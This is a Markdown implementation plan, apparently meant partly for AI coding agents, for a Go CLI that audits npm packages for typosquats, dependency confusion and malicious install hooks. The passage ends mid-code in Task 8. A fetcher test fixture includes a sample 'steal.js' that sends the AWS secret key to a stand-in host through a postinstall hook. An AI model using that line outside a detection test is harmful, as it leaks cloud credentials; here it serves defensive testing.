# Install-Time npm Package Auditor (`snare`) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an open-source Go CLI that audits the npm packages a pull request adds/bumps and flags typosquat / dependency-confusion / malicious-install-hook packages *before they execute*, with low false positives.

**Architecture:** Four decoupled units — `resolver` (lockfile diff → candidate set), `fetcher` (registry metadata + tarball, cached/offline-testable), `engine` (pure: package data → risk score via two evidence paths), `report` (score → human/JSON/SARIF + exit code). The engine is the moat and is pure/offline so a checked-in false-positive regression corpus can gate quality on every commit.

**Tech Stack:** Go 1.22+, **standard library only** for v1 (net/http, archive/tar, compress/gzip, encoding/json, flag) — a supply-chain tool must minimize its own supply chain. Module path `github.com/syedkarim/snare` (adjust to the real GitHub org before release).

---

## File Structure

```
snare/
  go.mod
  cmd/snare/main.go            # CLI entry: flag parsing, wires units, sets exit code
  internal/
    model/model.go             # shared types: Candidate, PackageData, Evidence, Tier, Result
    resolver/resolver.go       # package-lock.json parse + base/head diff → []Candidate
    resolver/resolver_test.go
    fetcher/fetcher.go         # Candidate -> PackageData (metadata + tarball), via Registry
    fetcher/cache.go           # content-addressed on-disk cache
    fetcher/fetcher_test.go
    registry/registry.go       # npm registry HTTP client + interface (mockable)
    registry/registry_test.go
    engine/engine.go           # Signal interface, Engine.Score aggregation + gating
    engine/engine_test.go
    engine/name.go             # Path 1: typosquat / dep-confusion name signal
    engine/name_test.go
    engine/metadata.go         # Path 1: metadata FP-killer signal
    engine/metadata_test.go
    engine/hooks.go            # Path 2: lifecycle-hook detection
    engine/hooks_test.go
    engine/inspect.go          # Path 2: install-script static inspection
    engine/inspect_test.go
    engine/popular.go          # bundled popular-package snapshot loader
    report/report.go           # Result -> human/JSON/SARIF; exit code
    report/report_test.go
    config/config.go           # policy + allowlist (.snareignore)
    config/config_test.go
  internal/engine/testdata/popular.txt   # bundled snapshot of popular npm names
  testdata/corpus/good/        # legit packages that MUST score CLEAR/LOW
  testdata/corpus/malicious/   # sanitized malicious samples that MUST score HIGH+
```

Each task below is TDD: failing test → run-it-fails → minimal code → run-it-passes → commit.

---

## Task 1: Project scaffold + CLI skeleton

**Files:**
- Create: `go.mod`
- Create: `cmd/snare/main.go`
- Test: `cmd/snare/main_test.go`

- [ ] **Step 1: Create the module**

Run:
```bash
cd ~/projects/snare && go mod init github.com/syedkarim/snare
```
Expected: creates `go.mod` with `go 1.22` (or installed version).

- [ ] **Step 2: Write the failing test**

`cmd/snare/main_test.go`:
```go
package main

import "testing"

func TestVersionString(t *testing.T) {
	if version == "" {
		t.Fatal("version must not be empty")
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `go test ./cmd/snare/`
Expected: FAIL — `undefined: version`.

- [ ] **Step 4: Write minimal implementation**

`cmd/snare/main.go`:
```go
package main

import (
	"flag"
	"fmt"
	"os"
)

var version = "0.0.0-dev"

func main() {
	fs := flag.NewFlagSet("snare", flag.ExitOnError)
	showVersion := fs.Bool("version", false, "print version and exit")
	_ = fs.Parse(os.Args[1:])

	if *showVersion {
		fmt.Println("snare", version)
		return
	}
	fmt.Fprintln(os.Stderr, "usage: snare audit [flags]")
	os.Exit(2)
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `go test ./cmd/snare/` → Expected: PASS. Also `go run ./cmd/snare --version` → prints `snare 0.0.0-dev`.

- [ ] **Step 6: Commit**

```bash
git add go.mod cmd/snare/main.go cmd/snare/main_test.go
git commit -m "feat: scaffold snare CLI module"
```

---

## Task 2: Shared model types

**Files:**
- Create: `internal/model/model.go`
- Test: `internal/model/model_test.go`

- [ ] **Step 1: Write the failing test**

`internal/model/model_test.go`:
```go
package model

import "testing"

func TestTierAtLeast(t *testing.T) {
	if !High.AtLeast(Medium) {
		t.Error("High should be >= Medium")
	}
	if Low.AtLeast(High) {
		t.Error("Low should not be >= High")
	}
}

func TestResultTopTier(t *testing.T) {
	r := Result{Evidence: []Evidence{{Tier: Low}, {Tier: High}, {Tier: Medium}}}
	if got := r.TopTier(); got != High {
		t.Errorf("TopTier = %v, want High", got)
	}
}

func TestResultTopTierEmpty(t *testing.T) {
	r := Result{}
	if got := r.TopTier(); got != Clear {
		t.Errorf("empty TopTier = %v, want Clear", got)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/model/` → Expected: FAIL (undefined types).

- [ ] **Step 3: Write minimal implementation**

`internal/model/model.go`:
```go
// Package model holds the shared data types passed between snare's units.
package model

// Tier is an ordered severity level. Higher value = more severe.
type Tier int

const (
	Clear Tier = iota
	Low
	Medium
	High
	Critical
)

func (t Tier) AtLeast(o Tier) bool { return t >= o }

func (t Tier) String() string {
	switch t {
	case Critical:
		return "CRITICAL"
	case High:
		return "HIGH"
	case Medium:
		return "MEDIUM"
	case Low:
		return "LOW"
	default:
		return "CLEAR"
	}
}

// Candidate is one package@version the PR adds or bumps.
type Candidate struct {
	Name    string
	Version string
}

// PackageData is everything fetched about a candidate needed for scoring.
type PackageData struct {
	Candidate
	// Manifest is the parsed package.json of this version.
	Manifest Manifest
	// Registry is registry-level metadata about the package (all versions).
	Registry RegistryInfo
	// Scripts maps lifecycle name (preinstall/install/postinstall) to script body.
	Scripts map[string]string
	// Files maps tarball-relative path to file contents (text files only, size-capped).
	Files map[string]string
}

// Manifest is the subset of package.json we use.
type Manifest struct {
	Name    string            `json:"name"`
	Version string            `json:"version"`
	Scripts map[string]string `json:"scripts"`
}

// RegistryInfo is package-level registry metadata.
type RegistryInfo struct {
	// FirstPublished is the time the very first version was published (RFC3339), "" if unknown.
	FirstPublished string
	// VersionPublished is when THIS version was published (RFC3339), "" if unknown.
	VersionPublished string
	// WeeklyDownloads is the most recent weekly download count, -1 if unknown.
	WeeklyDownloads int
	// Maintainers is the count of maintainers, -1 if unknown.
	Maintainers int
	// Repository is the declared source repo URL, "" if absent.
	Repository string
	// LatestVersion is the registry's current "latest" dist-tag.
	LatestVersion string
}

// Evidence is one finding from one signal. Never a bare boolean.
type Evidence struct {
	Signal      string // e.g. "name.typosquat"
	Tier        Tier
	Explanation string // human-readable "why"
	Locator     string // file/field this came from, "" if N/A
}

// Result is the full scored outcome for one candidate.
type Result struct {
	Candidate Candidate
	Evidence  []Evidence
	// Errored is true when the candidate could not be fully evaluated.
	Errored bool
	ErrMsg  string
}

// TopTier returns the highest evidence tier, or Clear if there is none.
func (r Result) TopTier() Tier {
	top := Clear
	for _, e := range r.Evidence {
		if e.Tier > top {
			top = e.Tier
		}
	}
	return top
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/model/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/model/
git commit -m "feat: shared model types (Tier, Candidate, PackageData, Evidence, Result)"
```

---

## Task 3: Lockfile-diff resolver

The resolver parses two `package-lock.json` files (base = PR target, head = PR branch) and returns the packages head adds or bumps. v3 lockfiles key packages under `"packages"` with paths like `node_modules/foo`.

**Files:**
- Create: `internal/resolver/resolver.go`
- Test: `internal/resolver/resolver_test.go`

- [ ] **Step 1: Write the failing test**

`internal/resolver/resolver_test.go`:
```go
package resolver

import (
	"reflect"
	"sort"
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

const baseLock = `{
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "app"},
    "node_modules/left-pad": {"version": "1.3.0"},
    "node_modules/react": {"version": "18.2.0"}
  }
}`

const headLock = `{
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "app"},
    "node_modules/left-pad": {"version": "1.3.0"},
    "node_modules/react": {"version": "18.3.0"},
    "node_modules/reqeusts": {"version": "0.0.1"}
  }
}`

func TestDiffAddedAndBumped(t *testing.T) {
	got, err := Diff([]byte(baseLock), []byte(headLock))
	if err != nil {
		t.Fatal(err)
	}
	sort.Slice(got, func(i, j int) bool { return got[i].Name < got[j].Name })
	want := []model.Candidate{
		{Name: "react", Version: "18.3.0"},   // bumped
		{Name: "reqeusts", Version: "0.0.1"}, // added (typosquat of requests)
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Diff = %#v, want %#v", got, want)
	}
}

func TestDiffUnchangedIsEmpty(t *testing.T) {
	got, err := Diff([]byte(baseLock), []byte(baseLock))
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Errorf("expected no candidates, got %#v", got)
	}
}

func TestDiffBadJSON(t *testing.T) {
	if _, err := Diff([]byte("{"), []byte(headLock)); err == nil {
		t.Error("expected error on malformed base lockfile")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/resolver/` → Expected: FAIL (undefined `Diff`).

- [ ] **Step 3: Write minimal implementation**

`internal/resolver/resolver.go`:
```go
// Package resolver turns a pair of package-lock.json files into the set of
// packages a PR adds or bumps.
package resolver

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/syedkarim/snare/internal/model"
)

type lockfile struct {
	Packages map[string]struct {
		Version string `json:"version"`
	} `json:"packages"`
}

func parse(data []byte, which string) (map[string]string, error) {
	var lf lockfile
	if err := json.Unmarshal(data, &lf); err != nil {
		return nil, fmt.Errorf("parse %s lockfile: %w", which, err)
	}
	out := make(map[string]string)
	for path, p := range lf.Packages {
		name := pkgName(path)
		if name == "" || p.Version == "" {
			continue // root ("") or version-less entry
		}
		out[name] = p.Version
	}
	return out, nil
}

// pkgName extracts the package name from a v3 lockfile path key like
// "node_modules/foo" or "node_modules/a/node_modules/@scope/bar".
func pkgName(path string) string {
	const nm = "node_modules/"
	i := strings.LastIndex(path, nm)
	if i < 0 {
		return ""
	}
	return path[i+len(nm):]
}

// Diff returns the packages present-and-newer (or present-and-new) in head
// relative to base.
func Diff(base, head []byte) ([]model.Candidate, error) {
	baseV, err := parse(base, "base")
	if err != nil {
		return nil, err
	}
	headV, err := parse(head, "head")
	if err != nil {
		return nil, err
	}
	var out []model.Candidate
	for name, hv := range headV {
		if bv, ok := baseV[name]; !ok || bv != hv {
			out = append(out, model.Candidate{Name: name, Version: hv})
		}
	}
	return out, nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/resolver/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/resolver/
git commit -m "feat: lockfile-diff resolver for v3 package-lock.json"
```

---

## Task 4: Registry client interface

Define a mockable interface so the fetcher and engine tests run fully offline.

**Files:**
- Create: `internal/registry/registry.go`
- Test: `internal/registry/registry_test.go`

- [ ] **Step 1: Write the failing test**

`internal/registry/registry_test.go`:
```go
package registry

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestHTTPClientFetchMetadata(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/reqeusts" {
			t.Errorf("unexpected path %s", r.URL.Path)
		}
		w.Write([]byte(`{"name":"reqeusts","dist-tags":{"latest":"0.0.1"},
			"time":{"created":"2026-05-01T00:00:00Z","0.0.1":"2026-05-01T00:00:00Z"},
			"maintainers":[{"name":"x"}],
			"versions":{"0.0.1":{"name":"reqeusts","version":"0.0.1","dist":{"tarball":"http://t/x.tgz"}}}}`))
	}))
	defer srv.Close()

	c := &HTTPClient{BaseURL: srv.URL, HTTP: srv.Client()}
	meta, err := c.Metadata("reqeusts")
	if err != nil {
		t.Fatal(err)
	}
	if meta.DistTags.Latest != "0.0.1" {
		t.Errorf("latest = %q", meta.DistTags.Latest)
	}
	if got := meta.TarballURL("0.0.1"); got != "http://t/x.tgz" {
		t.Errorf("tarball = %q", got)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/registry/` → Expected: FAIL (undefined `HTTPClient`).

- [ ] **Step 3: Write minimal implementation**

`internal/registry/registry.go`:
```go
// Package registry talks to the npm registry. The Client interface is mockable
// so higher layers test offline.
package registry

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

// Metadata is the subset of an npm registry packument we use.
type Metadata struct {
	Name     string            `json:"name"`
	DistTags struct{ Latest string `json:"latest"` } `json:"dist-tags"`
	Time     map[string]string `json:"time"` // "created", "<version>" -> RFC3339
	Maintainers []struct{ Name string `json:"name"` } `json:"maintainers"`
	Versions map[string]struct {
		Name    string            `json:"name"`
		Version string            `json:"version"`
		Scripts map[string]string `json:"scripts"`
		Repository json.RawMessage `json:"repository"`
		Dist    struct{ Tarball string `json:"tarball"` } `json:"dist"`
	} `json:"versions"`
}

// TarballURL returns the tarball URL for a version, "" if unknown.
func (m Metadata) TarballURL(version string) string {
	return m.Versions[version].Dist.Tarball
}

// Client is the registry capability higher layers depend on.
type Client interface {
	Metadata(name string) (Metadata, error)
	Tarball(url string) ([]byte, error)
}

// HTTPClient is the live npm-registry implementation.
type HTTPClient struct {
	BaseURL string // e.g. https://registry.npmjs.org
	HTTP    *http.Client
}

func (c *HTTPClient) httpClient() *http.Client {
	if c.HTTP != nil {
		return c.HTTP
	}
	return &http.Client{Timeout: 20 * time.Second}
}

func (c *HTTPClient) Metadata(name string) (Metadata, error) {
	url := c.BaseURL + "/" + name
	resp, err := c.httpClient().Get(url)
	if err != nil {
		return Metadata{}, fmt.Errorf("registry metadata %s: %w", name, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return Metadata{}, fmt.Errorf("registry metadata %s: status %d", name, resp.StatusCode)
	}
	var m Metadata
	if err := json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return Metadata{}, fmt.Errorf("decode metadata %s: %w", name, err)
	}
	return m, nil
}

const maxTarball = 50 << 20 // 50 MiB cap

func (c *HTTPClient) Tarball(url string) ([]byte, error) {
	resp, err := c.httpClient().Get(url)
	if err != nil {
		return nil, fmt.Errorf("tarball %s: %w", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("tarball %s: status %d", url, resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, maxTarball))
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/registry/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/registry/
git commit -m "feat: npm registry client with mockable Client interface"
```

---

## Task 5: Fetcher (metadata + tarball → PackageData)

Turns a `Candidate` into `model.PackageData`, extracting lifecycle scripts and small text files from the tarball. Uses the `registry.Client` interface so tests use a fake.

**Files:**
- Create: `internal/fetcher/fetcher.go`
- Test: `internal/fetcher/fetcher_test.go`

- [ ] **Step 1: Write the failing test**

`internal/fetcher/fetcher_test.go`:
```go
package fetcher

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"testing"

	"github.com/syedkarim/snare/internal/model"
	"github.com/syedkarim/snare/internal/registry"
)

// fakeRegistry implements registry.Client from in-memory fixtures.
type fakeRegistry struct {
	meta    registry.Metadata
	tarball []byte
}

func (f fakeRegistry) Metadata(string) (registry.Metadata, error) { return f.meta, nil }
func (f fakeRegistry) Tarball(string) ([]byte, error)             { return f.tarball, nil }

func makeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		hdr := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

func TestFetchExtractsScriptsAndFiles(t *testing.T) {
	pkgJSON := `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}`
	tarball := makeTarball(t, map[string]string{
		"package/package.json": pkgJSON,
		"package/steal.js":      "require('http').get('http://evil/'+process.env.AWS_SECRET_ACCESS_KEY)",
	})
	meta := registry.Metadata{Name: "evil"}
	meta.DistTags.Latest = "1.0.0"
	meta.Time = map[string]string{"created": "2026-05-01T00:00:00Z", "1.0.0": "2026-05-01T00:00:00Z"}
	meta.Maintainers = []struct{ Name string `json:"name"` }{{Name: "x"}}
	meta.Versions = map[string]struct {
		Name    string            `json:"name"`
		Version string            `json:"version"`
		Scripts map[string]string `json:"scripts"`
		Repository []byte          `json:"repository"`
		Dist    struct{ Tarball string `json:"tarball"` } `json:"dist"`
	}{} // NOTE: field types must match registry.Metadata; see step 3

	f := New(fakeRegistry{meta: meta, tarball: tarball})
	data, err := f.Fetch(model.Candidate{Name: "evil", Version: "1.0.0"})
	if err != nil {
		t.Fatal(err)
	}
	if data.Scripts["postinstall"] != "node steal.js" {
		t.Errorf("postinstall = %q", data.Scripts["postinstall"])
	}
	if _, ok := data.Files["steal.js"]; !ok {
		t.Errorf("expected steal.js in Files, got %v", data.Files)
	}
}
```

> **Implementation note for the engineer:** the inline struct literal for `meta.Versions` above must mirror the exact field set of `registry.Metadata.Versions`. To avoid duplicating that messy literal, prefer building `Metadata` by unmarshalling a JSON fixture string in the test (as Task 4 does) rather than struct literals. Rewrite this test to decode a JSON packument fixture; it is clearer and less brittle. The assertions (Scripts/Files) stay identical.

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/fetcher/` → Expected: FAIL (undefined `New`).

- [ ] **Step 3: Write minimal implementation**

`internal/fetcher/fetcher.go`:
```go
// Package fetcher turns a Candidate into model.PackageData using a registry.Client.
package fetcher

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"strings"

	"github.com/syedkarim/snare/internal/model"
	"github.com/syedkarim/snare/internal/registry"
)

const maxTextFile = 256 << 10 // only scan text files up to 256 KiB

// Fetcher builds PackageData from a registry.Client.
type Fetcher struct{ reg registry.Client }

func New(reg registry.Client) *Fetcher { return &Fetcher{reg: reg} }

func (f *Fetcher) Fetch(c model.Candidate) (model.PackageData, error) {
	meta, err := f.reg.Metadata(c.Name)
	if err != nil {
		return model.PackageData{}, err
	}
	data := model.PackageData{Candidate: c}
	data.Registry = toRegistryInfo(meta, c.Version)

	url := meta.TarballURL(c.Version)
	if url == "" {
		return data, fmt.Errorf("no tarball for %s@%s", c.Name, c.Version)
	}
	raw, err := f.reg.Tarball(url)
	if err != nil {
		return data, err
	}
	if err := extract(&data, raw); err != nil {
		return data, err
	}
	if data.Manifest.Scripts != nil {
		data.Scripts = lifecycleScripts(data.Manifest.Scripts)
	}
	return data, nil
}

func lifecycleScripts(all map[string]string) map[string]string {
	out := map[string]string{}
	for _, k := range []string{"preinstall", "install", "postinstall"} {
		if v, ok := all[k]; ok {
			out[k] = v
		}
	}
	return out
}

func extract(data *model.PackageData, raw []byte) error {
	gz, err := gzip.NewReader(bytes.NewReader(raw))
	if err != nil {
		return fmt.Errorf("gunzip: %w", err)
	}
	defer gz.Close()
	tr := tar.NewReader(gz)
	files := map[string]string{}
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("tar: %w", err)
		}
		if hdr.Typeflag != tar.TypeReg || hdr.Size > maxTextFile {
			continue
		}
		buf, err := io.ReadAll(io.LimitReader(tr, maxTextFile))
		if err != nil {
			return fmt.Errorf("read %s: %w", hdr.Name, err)
		}
		// npm tarballs prefix everything with "package/".
		rel := strings.TrimPrefix(hdr.Name, "package/")
		if rel == "package.json" {
			_ = json.Unmarshal(buf, &data.Manifest)
		}
		files[rel] = string(buf)
	}
	data.Files = files
	return nil
}

func toRegistryInfo(m registry.Metadata, version string) model.RegistryInfo {
	return model.RegistryInfo{
		FirstPublished:   m.Time["created"],
		VersionPublished: m.Time[version],
		WeeklyDownloads:  -1, // populated by a separate downloads endpoint in a later task
		Maintainers:      len(m.Maintainers),
		Repository:       string(m.Versions[version].Repository),
		LatestVersion:    m.DistTags.Latest,
	}
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/fetcher/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/fetcher/
git commit -m "feat: fetcher extracts lifecycle scripts and files from tarball"
```

---

## Task 6: Engine framework (Signal interface + aggregation)

**Files:**
- Create: `internal/engine/engine.go`
- Test: `internal/engine/engine_test.go`

- [ ] **Step 1: Write the failing test**

`internal/engine/engine_test.go`:
```go
package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

// stubSignal emits a fixed evidence (or none).
type stubSignal struct{ ev *model.Evidence }

func (s stubSignal) Name() string { return "stub" }
func (s stubSignal) Evaluate(model.PackageData) []model.Evidence {
	if s.ev == nil {
		return nil
	}
	return []model.Evidence{*s.ev}
}

func TestEngineAggregatesEvidence(t *testing.T) {
	e := New([]Signal{
		stubSignal{ev: &model.Evidence{Signal: "a", Tier: model.Medium}},
		stubSignal{ev: &model.Evidence{Signal: "b", Tier: model.High}},
		stubSignal{ev: nil},
	})
	res := e.Score(model.PackageData{})
	if res.TopTier() != model.High {
		t.Errorf("TopTier = %v, want High", res.TopTier())
	}
	if len(res.Evidence) != 2 {
		t.Errorf("evidence count = %d, want 2", len(res.Evidence))
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/engine/` → Expected: FAIL (undefined `New`/`Signal`).

- [ ] **Step 3: Write minimal implementation**

`internal/engine/engine.go`:
```go
// Package engine scores a package for install-time risk. It is pure: no network,
// no filesystem, so it is fully testable from fixtures.
package engine

import "github.com/syedkarim/snare/internal/model"

// Signal inspects a package and emits zero or more pieces of evidence.
type Signal interface {
	Name() string
	Evaluate(model.PackageData) []model.Evidence
}

// Engine runs all signals and aggregates their evidence.
type Engine struct{ signals []Signal }

func New(signals []Signal) *Engine { return &Engine{signals: signals} }

func (e *Engine) Score(p model.PackageData) model.Result {
	res := model.Result{Candidate: p.Candidate}
	for _, s := range e.signals {
		res.Evidence = append(res.Evidence, s.Evaluate(p)...)
	}
	return res
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/engine/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/engine/engine.go internal/engine/engine_test.go
git commit -m "feat: engine framework with Signal interface and aggregation"
```

---

## Task 7: Path 1 — name signal (typosquat + dep-confusion)

Emits HIGH-candidate evidence when a name is lexically near a popular package (typosquat) or the version is a dependency-confusion tell (`99.99.99`-style). This signal is intentionally **over-eager**; Task 8's metadata signal gates it down (the 80%→28% lever).

**Files:**
- Create: `internal/engine/popular.go`
- Create: `internal/engine/name.go`
- Create: `internal/engine/testdata/popular.txt`
- Test: `internal/engine/name_test.go`

- [ ] **Step 1: Create the bundled popular-name snapshot**

`internal/engine/testdata/popular.txt` (one name per line; seed with a handful now, expand before release):
```
react
requests
lodash
express
axios
chalk
left-pad
```

- [ ] **Step 2: Write the failing test**

`internal/engine/name_test.go`:
```go
package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func popularSet() map[string]bool {
	return map[string]bool{"react": true, "requests": true, "lodash": true, "express": true}
}

func TestNameSignalFlagsTyposquat(t *testing.T) {
	s := NewNameSignal(popularSet())
	ev := s.Evaluate(model.PackageData{Candidate: model.Candidate{Name: "reqeusts", Version: "0.0.1"}})
	if len(ev) == 0 {
		t.Fatal("expected typosquat evidence for reqeusts")
	}
	if ev[0].Signal != "name.typosquat" {
		t.Errorf("signal = %q", ev[0].Signal)
	}
}

func TestNameSignalIgnoresExactPopular(t *testing.T) {
	s := NewNameSignal(popularSet())
	if ev := s.Evaluate(model.PackageData{Candidate: model.Candidate{Name: "react", Version: "18.3.0"}}); len(ev) != 0 {
		t.Errorf("exact popular name should not be flagged, got %v", ev)
	}
}

func TestNameSignalFlagsVersionAnomaly(t *testing.T) {
	s := NewNameSignal(popularSet())
	ev := s.Evaluate(model.PackageData{Candidate: model.Candidate{Name: "internal-corp-utils", Version: "99.99.99"}})
	found := false
	for _, e := range ev {
		if e.Signal == "name.depconfusion" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected depconfusion evidence, got %v", ev)
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `go test ./internal/engine/ -run TestNameSignal` → Expected: FAIL (undefined `NewNameSignal`).

- [ ] **Step 4: Write minimal implementation**

`internal/engine/name.go`:
```go
package engine

import (
	"github.com/syedkarim/snare/internal/model"
)

// NameSignal flags typosquats (lexically near a popular name) and
// dependency-confusion version tells.
type NameSignal struct{ popular map[string]bool }

func NewNameSignal(popular map[string]bool) NameSignal { return NameSignal{popular: popular} }

func (NameSignal) Name() string { return "name" }

// depConfusionVersions are absurd versions used to win resolution races.
var depConfusionVersions = map[string]bool{
	"99.99.99": true, "100.100.100": true, "999.999.999": true,
}

func (s NameSignal) Evaluate(p model.PackageData) []model.Evidence {
	var ev []model.Evidence
	name := p.Candidate.Name

	if depConfusionVersions[p.Candidate.Version] {
		ev = append(ev, model.Evidence{
			Signal:      "name.depconfusion",
			Tier:        model.High,
			Explanation: "version " + p.Candidate.Version + " is an implausible value commonly used to win dependency-confusion resolution races",
			Locator:     "version",
		})
	}

	if s.popular[name] {
		return ev // exact match to a popular package is not a typosquat
	}
	for pop := range s.popular {
		if d := damerau(name, pop); d > 0 && d <= 2 {
			ev = append(ev, model.Evidence{
				Signal:      "name.typosquat",
				Tier:        model.High,
				Explanation: "name is " + itoa(d) + " edit(s) from popular package \"" + pop + "\"",
				Locator:     "name",
			})
			break
		}
	}
	return ev
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

// damerau computes Damerau-Levenshtein distance (handles adjacent transpositions
// like reqeusts<->requests).
func damerau(a, b string) int {
	la, lb := len(a), len(b)
	d := make([][]int, la+1)
	for i := range d {
		d[i] = make([]int, lb+1)
		d[i][0] = i
	}
	for j := 0; j <= lb; j++ {
		d[0][j] = j
	}
	for i := 1; i <= la; i++ {
		for j := 1; j <= lb; j++ {
			cost := 1
			if a[i-1] == b[j-1] {
				cost = 0
			}
			d[i][j] = min3(d[i-1][j]+1, d[i][j-1]+1, d[i-1][j-1]+cost)
			if i > 1 && j > 1 && a[i-1] == b[j-2] && a[i-2] == b[j-1] {
				if t := d[i-2][j-2] + 1; t < d[i][j] {
					d[i][j] = t
				}
			}
		}
	}
	return d[la][lb]
}

func min3(a, b, c int) int {
	m := a
	if b < m {
		m = b
	}
	if c < m {
		m = c
	}
	return m
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `go test ./internal/engine/ -run TestNameSignal` → Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/engine/name.go internal/engine/name_test.go internal/engine/testdata/popular.txt
git commit -m "feat: name signal (typosquat via Damerau-Levenshtein + dep-confusion versions)"
```

---

## Task 8: Path 1 — metadata signal (the FP-killer + gating)

Metadata evidence both *adds* risk (brand-new, zero-download, no-repo) and, crucially, lets the engine **downgrade name-only suspicion** when a package is clearly established. This task introduces gating in the engine.

**Files:**
- Create: `internal/engine/metadata.go`
- Modify: `internal/engine/engine.go` (add `gate` post-processing)
- Test: `internal/engine/metadata_test.go`

- [ ] **Step 1: Write the failing test**

`internal/engine/metadata_test.go`:
```go
package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func establishedPkg(name string) model.PackageData {
	return model.PackageData{
		Candidate: model.Candidate{Name: name, Version: "1.2.3"},
		Registry: model.RegistryInfo{
			FirstPublished:  "2015-01-01T00:00:00Z",
			WeeklyDownloads: 5_000_000,
			Maintainers:     4,
			Repository:      "git+https://github.com/x/y.git",
		},
	}
}

func TestMetadataFlagsBrandNewZeroDownload(t *testing.T) {
	s := NewMetadataSignal(refNow)
	p := model.PackageData{
		Candidate: model.Candidate{Name: "reqeusts", Version: "0.0.1"},
		Registry:  model.RegistryInfo{FirstPublished: "2026-06-06T00:00:00Z", WeeklyDownloads: 3, Maintainers: 1},
	}
	ev := s.Evaluate(p)
	if len(ev) == 0 {
		t.Fatal("expected metadata risk evidence for brand-new low-download package")
	}
}

func TestGateDowngradesTyposquatOnEstablishedPackage(t *testing.T) {
	// "preact" is 2 edits from "react" -> name signal flags it HIGH.
	// But preact is old + popular, so the gate must downgrade it.
	e := New([]Signal{
		NewNameSignal(map[string]bool{"react": true}),
		NewMetadataSignal(refNow),
	})
	res := e.Score(establishedPkg("preact"))
	if res.TopTier() >= model.High {
		t.Errorf("established near-name package should be downgraded below HIGH, got %v", res.TopTier())
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/engine/ -run 'TestMetadata|TestGate'` → Expected: FAIL (undefined `NewMetadataSignal`, `refNow`).

- [ ] **Step 3: Write minimal implementation**

`internal/engine/metadata.go`:
```go
package engine

import (
	"time"

	"github.com/syedkarim/snare/internal/model"
)

// refNow is the reference "now" used for age math. Injected so tests are
// deterministic; production passes time.Now().
var refNow = mustTime("2026-06-07T00:00:00Z")

func mustTime(s string) time.Time {
	t, err := time.Parse(time.RFC3339, s)
	if err != nil {
		panic(err)
	}
	return t
}

// MetadataSignal scores reputation: new + low-download + no-repo = risk.
type MetadataSignal struct{ now time.Time }

func NewMetadataSignal(now time.Time) MetadataSignal { return MetadataSignal{now: now} }

func (MetadataSignal) Name() string { return "metadata" }

func (s MetadataSignal) Evaluate(p model.PackageData) []model.Evidence {
	var ev []model.Evidence
	if s.isEstablished(p) {
		return ev // reputable: contributes no risk (gate uses isEstablished separately)
	}
	young := s.ageDays(p) >= 0 && s.ageDays(p) <= 30
	lowDL := p.Registry.WeeklyDownloads >= 0 && p.Registry.WeeklyDownloads < 100
	if young && lowDL {
		ev = append(ev, model.Evidence{
			Signal:      "metadata.new_unpopular",
			Tier:        model.Medium,
			Explanation: "package is <30 days old with <100 weekly downloads",
			Locator:     "registry",
		})
	}
	if p.Registry.Repository == "" {
